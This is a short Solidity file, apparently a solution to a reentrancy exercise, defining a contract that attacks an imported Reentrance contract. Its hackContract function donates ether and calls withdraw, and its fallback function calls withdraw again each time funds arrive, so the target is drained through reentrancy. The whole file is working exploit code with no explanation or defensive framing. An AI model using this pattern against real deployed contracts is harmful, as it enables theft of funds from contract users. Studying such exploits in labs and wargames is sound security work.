// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    fallback() external payable {
        Reentrance r = Reentrance(contractAddress);
        r.withdraw();
    }

    function hackContract() external {
        Reentrance r = Reentrance(contractAddress);
        r.donate{value: address(this).balance}(address(this));
        r.withdraw();
    }
}
